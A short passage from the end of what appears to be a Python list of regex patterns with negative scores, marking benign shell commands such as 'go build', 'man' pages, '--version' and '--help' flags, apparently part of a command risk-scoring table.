    (r"go\s+build\b", -30, "Go build"),
    
    # Documentation
    (r"man\s+\w+", -50, "Manual page"),
    (r"--version\b", -50, "Version check"),
    (r"--help\b", -50, "Help flag"),
]
```

---

**Document End**
